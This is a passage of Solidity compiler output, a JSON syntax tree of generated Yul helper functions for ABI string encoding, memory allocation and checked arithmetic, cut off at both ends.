name":"tail","nodeType":"YulTypedName","src":"14278:4:15","type":""}],"src":"14112:419:15"},{"body":{"nodeType":"YulBlock","src":"14708:248:15","statements":[{"nodeType":"YulAssignment","src":"14718:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"14730:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"14741:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"14726:3:15"},"nodeType":"YulFunctionCall","src":"14726:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"14718:4:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"14765:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"14776:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"14761:3:15"},"nodeType":"YulFunctionCall","src":"14761:17:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"14784:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"14790:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"14780:3:15"},"nodeType":"YulFunctionCall","src":"14780:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"14754:6:15"},"nodeType":"YulFunctionCall","src":"14754:47:15"},"nodeType":"YulExpressionStatement","src":"14754:47:15"},{"nodeType":"YulAssignment","src":"14810:139:15","value":{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"14944:4:15"}],"functionName":{"name":"abi_encode_t_stringliteral_455fea98ea03c32d7dd1a6f1426917d80529bf47b3ccbde74e7206e889e709f4_to_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"14818:124:15"},"nodeType":"YulFunctionCall","src":"14818:131:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"14810:4:15"}]}]},"name":"abi_encode_tuple_t_stringliteral_455fea98ea03c32d7dd1a6f1426917d80529bf47b3ccbde74e7206e889e709f4__to_t_string_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"14688:9:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"14703:4:15","type":""}],"src":"14537:419:15"},{"body":{"nodeType":"YulBlock","src":"15133:248:15","statements":[{"nodeType":"YulAssignment","src":"15143:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"15155:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"15166:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"15151:3:15"},"nodeType":"YulFunctionCall","src":"15151:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"15143:4:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"15190:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"15201:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"15186:3:15"},"nodeType":"YulFunctionCall","src":"15186:17:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"15209:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"15215:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"15205:3:15"},"nodeType":"YulFunctionCall","src":"15205:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"15179:6:15"},"nodeType":"YulFunctionCall","src":"15179:47:15"},"nodeType":"YulExpressionStatement","src":"15179:47:15"},{"nodeType":"YulAssignment","src":"15235:139:15","value":{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"15369:4:15"}],"functionName":{"name":"abi_encode_t_stringliteral_45fe4329685be5ecd250fd0e6a25aea0ea4d0e30fb6a73c118b95749e6d70d05_to_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"15243:124:15"},"nodeType":"YulFunctionCall","src":"15243:131:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"15235:4:15"}]}]},"name":"abi_encode_tuple_t_stringliteral_45fe4329685be5ecd250fd0e6a25aea0ea4d0e30fb6a73c118b95749e6d70d05__to_t_string_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"15113:9:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"15128:4:15","type":""}],"src":"14962:419:15"},{"body":{"nodeType":"YulBlock","src":"15558:248:15","statements":[{"nodeType":"YulAssignment","src":"15568:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"15580:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"15591:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"15576:3:15"},"nodeType":"YulFunctionCall","src":"15576:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"15568:4:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"15615:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"15626:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"15611:3:15"},"nodeType":"YulFunctionCall","src":"15611:17:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"15634:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"15640:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"15630:3:15"},"nodeType":"YulFunctionCall","src":"15630:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"15604:6:15"},"nodeType":"YulFunctionCall","src":"15604:47:15"},"nodeType":"YulExpressionStatement","src":"15604:47:15"},{"nodeType":"YulAssignment","src":"15660:139:15","value":{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"15794:4:15"}],"functionName":{"name":"abi_encode_t_stringliteral_6d05c90094f31cfeb8f0eb86f0a513af3f7f8992991fbde41b08aa7960677159_to_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"15668:124:15"},"nodeType":"YulFunctionCall","src":"15668:131:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"15660:4:15"}]}]},"name":"abi_encode_tuple_t_stringliteral_6d05c90094f31cfeb8f0eb86f0a513af3f7f8992991fbde41b08aa7960677159__to_t_string_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"15538:9:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"15553:4:15","type":""}],"src":"15387:419:15"},{"body":{"nodeType":"YulBlock","src":"15983:248:15","statements":[{"nodeType":"YulAssignment","src":"15993:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"16005:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"16016:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"16001:3:15"},"nodeType":"YulFunctionCall","src":"16001:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"15993:4:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"16040:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"16051:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"16036:3:15"},"nodeType":"YulFunctionCall","src":"16036:17:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"16059:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"16065:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"16055:3:15"},"nodeType":"YulFunctionCall","src":"16055:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"16029:6:15"},"nodeType":"YulFunctionCall","src":"16029:47:15"},"nodeType":"YulExpressionStatement","src":"16029:47:15"},{"nodeType":"YulAssignment","src":"16085:139:15","value":{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"16219:4:15"}],"functionName":{"name":"abi_encode_t_stringliteral_8a66f4bb6512ffbfcc3db9b42318eb65f26ac15163eaa9a1e5cfa7bee9d1c7c6_to_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"16093:124:15"},"nodeType":"YulFunctionCall","src":"16093:131:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"16085:4:15"}]}]},"name":"abi_encode_tuple_t_stringliteral_8a66f4bb6512ffbfcc3db9b42318eb65f26ac15163eaa9a1e5cfa7bee9d1c7c6__to_t_string_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"15963:9:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"15978:4:15","type":""}],"src":"15812:419:15"},{"body":{"nodeType":"YulBlock","src":"16408:248:15","statements":[{"nodeType":"YulAssignment","src":"16418:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"16430:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"16441:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"16426:3:15"},"nodeType":"YulFunctionCall","src":"16426:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"16418:4:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"16465:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"16476:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"16461:3:15"},"nodeType":"YulFunctionCall","src":"16461:17:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"16484:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"16490:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"16480:3:15"},"nodeType":"YulFunctionCall","src":"16480:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"16454:6:15"},"nodeType":"YulFunctionCall","src":"16454:47:15"},"nodeType":"YulExpressionStatement","src":"16454:47:15"},{"nodeType":"YulAssignment","src":"16510:139:15","value":{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"16644:4:15"}],"functionName":{"name":"abi_encode_t_stringliteral_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f_to_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"16518:124:15"},"nodeType":"YulFunctionCall","src":"16518:131:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"16510:4:15"}]}]},"name":"abi_encode_tuple_t_stringliteral_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f__to_t_string_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"16388:9:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"16403:4:15","type":""}],"src":"16237:419:15"},{"body":{"nodeType":"YulBlock","src":"16833:248:15","statements":[{"nodeType":"YulAssignment","src":"16843:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"16855:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"16866:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"16851:3:15"},"nodeType":"YulFunctionCall","src":"16851:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"16843:4:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"16890:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"16901:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"16886:3:15"},"nodeType":"YulFunctionCall","src":"16886:17:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"16909:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"16915:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"16905:3:15"},"nodeType":"YulFunctionCall","src":"16905:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"16879:6:15"},"nodeType":"YulFunctionCall","src":"16879:47:15"},"nodeType":"YulExpressionStatement","src":"16879:47:15"},{"nodeType":"YulAssignment","src":"16935:139:15","value":{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"17069:4:15"}],"functionName":{"name":"abi_encode_t_stringliteral_b287e910c6a9cef9f186108b89a3a957a66db6db4d5eed8b59288161d029857b_to_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"16943:124:15"},"nodeType":"YulFunctionCall","src":"16943:131:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"16935:4:15"}]}]},"name":"abi_encode_tuple_t_stringliteral_b287e910c6a9cef9f186108b89a3a957a66db6db4d5eed8b59288161d029857b__to_t_string_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"16813:9:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"16828:4:15","type":""}],"src":"16662:419:15"},{"body":{"nodeType":"YulBlock","src":"17258:248:15","statements":[{"nodeType":"YulAssignment","src":"17268:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"17280:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"17291:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"17276:3:15"},"nodeType":"YulFunctionCall","src":"17276:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"17268:4:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"17315:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"17326:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"17311:3:15"},"nodeType":"YulFunctionCall","src":"17311:17:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"17334:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"17340:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"17330:3:15"},"nodeType":"YulFunctionCall","src":"17330:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"17304:6:15"},"nodeType":"YulFunctionCall","src":"17304:47:15"},"nodeType":"YulExpressionStatement","src":"17304:47:15"},{"nodeType":"YulAssignment","src":"17360:139:15","value":{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"17494:4:15"}],"functionName":{"name":"abi_encode_t_stringliteral_b51b4875eede07862961e8f9365c6749f5fe55c6ee5d7a9e42b6912ad0b15942_to_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"17368:124:15"},"nodeType":"YulFunctionCall","src":"17368:131:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"17360:4:15"}]}]},"name":"abi_encode_tuple_t_stringliteral_b51b4875eede07862961e8f9365c6749f5fe55c6ee5d7a9e42b6912ad0b15942__to_t_string_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"17238:9:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"17253:4:15","type":""}],"src":"17087:419:15"},{"body":{"nodeType":"YulBlock","src":"17683:248:15","statements":[{"nodeType":"YulAssignment","src":"17693:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"17705:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"17716:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"17701:3:15"},"nodeType":"YulFunctionCall","src":"17701:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"17693:4:15"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"17740:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"17751:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"17736:3:15"},"nodeType":"YulFunctionCall","src":"17736:17:15"},{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"17759:4:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"17765:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"17755:3:15"},"nodeType":"YulFunctionCall","src":"17755:20:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"17729:6:15"},"nodeType":"YulFunctionCall","src":"17729:47:15"},"nodeType":"YulExpressionStatement","src":"17729:47:15"},{"nodeType":"YulAssignment","src":"17785:139:15","value":{"arguments":[{"name":"tail","nodeType":"YulIdentifier","src":"17919:4:15"}],"functionName":{"name":"abi_encode_t_stringliteral_c6e14a63ffb144eeef7cce6988e5dce07c60a7e0a7b1ef25dbe18c61483e0a83_to_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"17793:124:15"},"nodeType":"YulFunctionCall","src":"17793:131:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"17785:4:15"}]}]},"name":"abi_encode_tuple_t_stringliteral_c6e14a63ffb144eeef7cce6988e5dce07c60a7e0a7b1ef25dbe18c61483e0a83__to_t_string_memory_ptr__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"17663:9:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"17678:4:15","type":""}],"src":"17512:419:15"},{"body":{"nodeType":"YulBlock","src":"18035:124:15","statements":[{"nodeType":"YulAssignment","src":"18045:26:15","value":{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"18057:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"18068:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"18053:3:15"},"nodeType":"YulFunctionCall","src":"18053:18:15"},"variableNames":[{"name":"tail","nodeType":"YulIdentifier","src":"18045:4:15"}]},{"expression":{"arguments":[{"name":"value0","nodeType":"YulIdentifier","src":"18125:6:15"},{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"18138:9:15"},{"kind":"number","nodeType":"YulLiteral","src":"18149:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"18134:3:15"},"nodeType":"YulFunctionCall","src":"18134:17:15"}],"functionName":{"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nodeType":"YulIdentifier","src":"18081:43:15"},"nodeType":"YulFunctionCall","src":"18081:71:15"},"nodeType":"YulExpressionStatement","src":"18081:71:15"}]},"name":"abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"18007:9:15","type":""},{"name":"value0","nodeType":"YulTypedName","src":"18019:6:15","type":""}],"returnVariables":[{"name":"tail","nodeType":"YulTypedName","src":"18030:4:15","type":""}],"src":"17937:222:15"},{"body":{"nodeType":"YulBlock","src":"18206:88:15","statements":[{"nodeType":"YulAssignment","src":"18216:30:15","value":{"arguments":[],"functionName":{"name":"allocate_unbounded","nodeType":"YulIdentifier","src":"18226:18:15"},"nodeType":"YulFunctionCall","src":"18226:20:15"},"variableNames":[{"name":"memPtr","nodeType":"YulIdentifier","src":"18216:6:15"}]},{"expression":{"arguments":[{"name":"memPtr","nodeType":"YulIdentifier","src":"18275:6:15"},{"name":"size","nodeType":"YulIdentifier","src":"18283:4:15"}],"functionName":{"name":"finalize_allocation","nodeType":"YulIdentifier","src":"18255:19:15"},"nodeType":"YulFunctionCall","src":"18255:33:15"},"nodeType":"YulExpressionStatement","src":"18255:33:15"}]},"name":"allocate_memory","nodeType":"YulFunctionDefinition","parameters":[{"name":"size","nodeType":"YulTypedName","src":"18190:4:15","type":""}],"returnVariables":[{"name":"memPtr","nodeType":"YulTypedName","src":"18199:6:15","type":""}],"src":"18165:129:15"},{"body":{"nodeType":"YulBlock","src":"18340:35:15","statements":[{"nodeType":"YulAssignment","src":"18350:19:15","value":{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"18366:2:15","type":"","value":"64"}],"functionName":{"name":"mload","nodeType":"YulIdentifier","src":"18360:5:15"},"nodeType":"YulFunctionCall","src":"18360:9:15"},"variableNames":[{"name":"memPtr","nodeType":"YulIdentifier","src":"18350:6:15"}]}]},"name":"allocate_unbounded","nodeType":"YulFunctionDefinition","returnVariables":[{"name":"memPtr","nodeType":"YulTypedName","src":"18333:6:15","type":""}],"src":"18300:75:15"},{"body":{"nodeType":"YulBlock","src":"18447:241:15","statements":[{"body":{"nodeType":"YulBlock","src":"18552:22:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"panic_error_0x41","nodeType":"YulIdentifier","src":"18554:16:15"},"nodeType":"YulFunctionCall","src":"18554:18:15"},"nodeType":"YulExpressionStatement","src":"18554:18:15"}]},"condition":{"arguments":[{"name":"length","nodeType":"YulIdentifier","src":"18524:6:15"},{"kind":"number","nodeType":"YulLiteral","src":"18532:18:15","type":"","value":"0xffffffffffffffff"}],"functionName":{"name":"gt","nodeType":"YulIdentifier","src":"18521:2:15"},"nodeType":"YulFunctionCall","src":"18521:30:15"},"nodeType":"YulIf","src":"18518:56:15"},{"nodeType":"YulAssignment","src":"18584:37:15","value":{"arguments":[{"name":"length","nodeType":"YulIdentifier","src":"18614:6:15"}],"functionName":{"name":"round_up_to_mul_of_32","nodeType":"YulIdentifier","src":"18592:21:15"},"nodeType":"YulFunctionCall","src":"18592:29:15"},"variableNames":[{"name":"size","nodeType":"YulIdentifier","src":"18584:4:15"}]},{"nodeType":"YulAssignment","src":"18658:23:15","value":{"arguments":[{"name":"size","nodeType":"YulIdentifier","src":"18670:4:15"},{"kind":"number","nodeType":"YulLiteral","src":"18676:4:15","type":"","value":"0x20"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"18666:3:15"},"nodeType":"YulFunctionCall","src":"18666:15:15"},"variableNames":[{"name":"size","nodeType":"YulIdentifier","src":"18658:4:15"}]}]},"name":"array_allocation_size_t_bytes_memory_ptr","nodeType":"YulFunctionDefinition","parameters":[{"name":"length","nodeType":"YulTypedName","src":"18431:6:15","type":""}],"returnVariables":[{"name":"size","nodeType":"YulTypedName","src":"18442:4:15","type":""}],"src":"18381:307:15"},{"body":{"nodeType":"YulBlock","src":"18752:40:15","statements":[{"nodeType":"YulAssignment","src":"18763:22:15","value":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"18779:5:15"}],"functionName":{"name":"mload","nodeType":"YulIdentifier","src":"18773:5:15"},"nodeType":"YulFunctionCall","src":"18773:12:15"},"variableNames":[{"name":"length","nodeType":"YulIdentifier","src":"18763:6:15"}]}]},"name":"array_length_t_bytes_memory_ptr","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"18735:5:15","type":""}],"returnVariables":[{"name":"length","nodeType":"YulTypedName","src":"18745:6:15","type":""}],"src":"18694:98:15"},{"body":{"nodeType":"YulBlock","src":"18857:40:15","statements":[{"nodeType":"YulAssignment","src":"18868:22:15","value":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"18884:5:15"}],"functionName":{"name":"mload","nodeType":"YulIdentifier","src":"18878:5:15"},"nodeType":"YulFunctionCall","src":"18878:12:15"},"variableNames":[{"name":"length","nodeType":"YulIdentifier","src":"18868:6:15"}]}]},"name":"array_length_t_string_memory_ptr","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"18840:5:15","type":""}],"returnVariables":[{"name":"length","nodeType":"YulTypedName","src":"18850:6:15","type":""}],"src":"18798:99:15"},{"body":{"nodeType":"YulBlock","src":"18998:73:15","statements":[{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"19015:3:15"},{"name":"length","nodeType":"YulIdentifier","src":"19020:6:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"19008:6:15"},"nodeType":"YulFunctionCall","src":"19008:19:15"},"nodeType":"YulExpressionStatement","src":"19008:19:15"},{"nodeType":"YulAssignment","src":"19036:29:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"19055:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"19060:4:15","type":"","value":"0x20"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"19051:3:15"},"nodeType":"YulFunctionCall","src":"19051:14:15"},"variableNames":[{"name":"updated_pos","nodeType":"YulIdentifier","src":"19036:11:15"}]}]},"name":"array_storeLengthForEncoding_t_bytes_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"18970:3:15","type":""},{"name":"length","nodeType":"YulTypedName","src":"18975:6:15","type":""}],"returnVariables":[{"name":"updated_pos","nodeType":"YulTypedName","src":"18986:11:15","type":""}],"src":"18903:168:15"},{"body":{"nodeType":"YulBlock","src":"19173:73:15","statements":[{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"19190:3:15"},{"name":"length","nodeType":"YulIdentifier","src":"19195:6:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"19183:6:15"},"nodeType":"YulFunctionCall","src":"19183:19:15"},"nodeType":"YulExpressionStatement","src":"19183:19:15"},{"nodeType":"YulAssignment","src":"19211:29:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"19230:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"19235:4:15","type":"","value":"0x20"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"19226:3:15"},"nodeType":"YulFunctionCall","src":"19226:14:15"},"variableNames":[{"name":"updated_pos","nodeType":"YulIdentifier","src":"19211:11:15"}]}]},"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"19145:3:15","type":""},{"name":"length","nodeType":"YulTypedName","src":"19150:6:15","type":""}],"returnVariables":[{"name":"updated_pos","nodeType":"YulTypedName","src":"19161:11:15","type":""}],"src":"19077:169:15"},{"body":{"nodeType":"YulBlock","src":"19296:261:15","statements":[{"nodeType":"YulAssignment","src":"19306:25:15","value":{"arguments":[{"name":"x","nodeType":"YulIdentifier","src":"19329:1:15"}],"functionName":{"name":"cleanup_t_uint256","nodeType":"YulIdentifier","src":"19311:17:15"},"nodeType":"YulFunctionCall","src":"19311:20:15"},"variableNames":[{"name":"x","nodeType":"YulIdentifier","src":"19306:1:15"}]},{"nodeType":"YulAssignment","src":"19340:25:15","value":{"arguments":[{"name":"y","nodeType":"YulIdentifier","src":"19363:1:15"}],"functionName":{"name":"cleanup_t_uint256","nodeType":"YulIdentifier","src":"19345:17:15"},"nodeType":"YulFunctionCall","src":"19345:20:15"},"variableNames":[{"name":"y","nodeType":"YulIdentifier","src":"19340:1:15"}]},{"body":{"nodeType":"YulBlock","src":"19503:22:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"panic_error_0x11","nodeType":"YulIdentifier","src":"19505:16:15"},"nodeType":"YulFunctionCall","src":"19505:18:15"},"nodeType":"YulExpressionStatement","src":"19505:18:15"}]},"condition":{"arguments":[{"name":"x","nodeType":"YulIdentifier","src":"19424:1:15"},{"arguments":[{"kind":"number","nodeType":"YulLiteral","src":"19431:66:15","type":"","value":"0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"},{"name":"y","nodeType":"YulIdentifier","src":"19499:1:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"19427:3:15"},"nodeType":"YulFunctionCall","src":"19427:74:15"}],"functionName":{"name":"gt","nodeType":"YulIdentifier","src":"19421:2:15"},"nodeType":"YulFunctionCall","src":"19421:81:15"},"nodeType":"YulIf","src":"19418:107:15"},{"nodeType":"YulAssignment","src":"19535:16:15","value":{"arguments":[{"name":"x","nodeType":"YulIdentifier","src":"19546:1:15"},{"name":"y","nodeType":"YulIdentifier","src":"19549:1:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"19542:3:15"},"nodeType":"YulFunctionCall","src":"19542:9:15"},"variableNames":[{"name":"sum","nodeType":"YulIdentifier","src":"19535:3:15"}]}]},"name":"checked_add_t_uint256","nodeType":"YulFunctionDefinition","parameters":[{"name":"x","nodeType":"YulTypedName","src":"19283:1:15","type":""},{"name":"y","nodeType":"YulTypedName","src":"19286:1:15","type":""}],"returnVariables":[{"name":"sum","nodeType":"YulTypedName","src":"19292:3:15","type":""}],"src":"19252:305:15"},{"body":{"nodeType":"YulBlock","src":"19608:146:15","statements":[{"nodeType":"YulAssignment","src":"19618:25:15","value":{"arguments":[{"name":"x","nodeType":"YulIdentifier","src":"19641:1:15"}],"functionName":{"name":"cleanup_t_uint256","nodeType":"YulIdentifier","src":"19623:17:15"},"nodeType":"YulFunctionCall","src":"19623:20:15"},"variableNames":[{"name":"x","nodeType":"YulIdentifier","src":"19618:1:15"}]},{"nodeType":"YulAssignment","src":"19652:25:15","value":{"arguments":[{"name":"y","nodeType":"YulIdentifier","src":"19675:1:15"}],"functionName":{"name":"cleanup_t_uint256","nodeType":"YulIdentifier","src":"19657:17:15"},"nodeType":"YulFunctionCall","src":"19657:20:15"},"variableNames":[{"name":"y","nodeType":"YulIdentifier","src":"19652:1:15"}]},{"body":{"nodeType":"YulBlock","src":"19699:22:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"panic_error_0x11","nodeType":"YulIdentifier","src":"19701:16:15"},"nodeType":"YulFunctionCall","src":"19701:18:15"},"nodeType":"YulExpressionStatement","src":"19701:18:15"}]},"condition":{"arguments":[{"name":"x","nodeType":"YulIdentifier","src":"19693:1:15"},{"name":"y","nodeType":"YulIdentifier","src":"19696:1:15"}],"functionName":{"name":"lt","node